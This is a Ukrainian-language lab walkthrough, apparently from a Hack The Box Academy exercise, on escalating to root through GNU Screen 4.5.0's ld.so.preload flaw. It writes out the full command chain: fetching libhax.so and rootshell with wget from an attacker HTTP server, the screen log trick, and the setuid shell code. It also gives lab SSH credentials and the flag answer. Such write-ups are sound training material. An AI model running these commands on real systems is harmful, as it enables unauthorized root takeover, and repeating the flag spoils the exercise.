## Vulnerable Services – Screen exploit

Ціль: `10.129.114.247`  

Питання:
- Connect to the target system and escalate privileges using the Screen exploit.
- Submit вміст `flag.txt` у `/root/screen_exploit`.

Відповідь:
- `91927dad55ffd22825660da88f2f92e0`

***

## Ідея експлойту Screen 4.5.0

На цілі:

```bash
screen --version
# Screen version 4.05.00 (GNU) 10-Dec-16
```

Ця версія вразлива до локального привілегій-ескалаційного експлойту, описаного як **GNU Screen 4.5.0 – Local Privilege Escalation** через маніпуляцію файлом `ld.so.preload`. [exploit-db](https://www.exploit-db.com/exploits/41154)

СетUID root-екземпляр `screen` дозволяє:

- записати довільні дані в `/etc/ld.so.preload`;
- змусити динамічний лінкер завантажити наш `libhax.so` як root;
- бібліотека робить `chown`/`chmod` `rootshell`, перетворюючи його на SUID root-бінарник; [github](https://github.com/YasserREED/screen-v4.5.0-priv-escalate)
- після чого ми запускаємо `/tmp/rootshell` і отримуємо root shell.

***

## Крок 1 — Підготовка експлойт-файлів на атакувальній машині

На Pwnbox:

```bash
git clone https://github.com/YasserREED/screen-v4.5.0-priv-escalate.git
cd screen-v4.5.0-priv-escalate
chmod +x exploit.sh
./exploit.sh
```

Скрипт:

- генерує `libhax.c` і компілює його в `/tmp/libhax.so`;
- генерує `rootshell.c` і компілює в `/tmp/rootshell`; [exploit-db](https://www.exploit-db.com/exploits/41154)
- показує підказку, що файли треба передати на ціль.

Ти потім скопіював ці файли в локальний `/tmp` на Pwnbox:

```bash
ls /tmp
# libhax.so
# rootshell
...
```

***

## Крок 2 — HTTP-сервер для передачі libhax.so і rootshell

На Pwnbox:

```bash
python3 -m http.server 8000
```

- Підіймає простий HTTP-сервер на порту 8000, з якого ціль завантажує `libhax.so` і `rootshell`. [github](https://github.com/YasserREED/screen-v4.5.0-priv-escalate)

На цілі (`10.129.114.247`) ти робиш:

```bash
cd /tmp
wget http://10.10.15.234:8000/libhax.so
wget http://10.10.15.234:8000/rootshell
chmod +x /tmp/libhax.so
chmod +x /tmp/rootshell
```

***

## Крок 3 — Зловживання Screen для запису в /etc/ld.so.preload

На цілі:

```bash
cd /etc || exit 1
umask 000
screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"
```

Розбір:

- `cd /etc` – йдемо у каталог, де лежить `ld.so.preload`.
- `umask 000` – знімаємо маску прав, щоб файл створювався максимально відкритий. [exploit-db](https://www.exploit-db.com/exploits/41154)
- `screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"`:
  - запускає `screen` у **detach-режимі**, створюючи лог-файл `ld.so.preload`;
  - `-L ld.so.preload` – змушує screen писати лог у `/etc/ld.so.preload`; [exploit-db](https://www.exploit-db.com/exploits/41154)
  - в лог записується рядок `\n/tmp/libhax.so` (перша позиція – newline, далі шлях до бібліотеки).
- У результаті `/etc/ld.so.preload` містить шлях до нашої `libhax.so`, яку root-процеси будуть підвантажувати.

***

## Крок 4 — Тригер завантаження ld.so.preload і створення root-шелла

Далі згідно з експлойтом: [exploit-db](https://www.exploit-db.com/exploits/41154)

```bash
screen -ls
/tmp/rootshell
```

У твоїй практиці:

```bash
cd /tmp
/tmp/rootshell
```

`rootshell`:

- був змінений `libhax.so` (через розгортання у контексті root) на SUID root-бінарник; [exploit-db](https://www.exploit-db.com/exploits/41154)
- при запуску виконує:

  ```c
  setuid(0);
  setgid(0);
  execvp("/bin/sh", NULL, NULL);
  ```

- отже ти отримуєш shell з `uid=0` (root).

Після запуску:

```bash
/tmp/rootshell
# whoami
# root
```

***

## Крок 5 — Прочитати flag.txt в /root/screen_exploit

У root-шеллі:

```bash
cd /root/screen_exploit
ls
# flag.txt

cat flag.txt
# 91927dad55ffd22825660da88f2f92e0
```

Вміст `flag.txt` – це і є відповідь:

> `91927dad55ffd22825660da88f2f92e0`

***

## Конспект команд для Vulnerable Services / Screen

1. На Pwnbox:

   ```bash
   git clone https://github.com/YasserREED/screen-v4.5.0-priv-escalate.git
   cd screen-v4.5.0-priv-escalate
   chmod +x exploit.sh
   ./exploit.sh
   python3 -m http.server 8000
   ```

2. На цілі (`10.129.114.247`):

   ```bash
   ssh htb-student@10.129.114.247
   # Password: Academy_LLPE!

   screen --version   # Screen 4.05.00 (vulnerable)

   cd /tmp
   wget http://10.10.15.234:8000/libhax.so
   wget http://10.10.15.234:8000/rootshell
   chmod +x libhax.so rootshell

   cd /etc || exit 1
   umask 000
   screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"
   screen -ls        # тригер лінкера

   cd /tmp
   /tmp/rootshell    # root shell
   ```

3. Як root:

   ```bash
   cd /root/screen_exploit
   cat flag.txt
   # 91927dad55ffd22825660da88f2f92e0
   ```
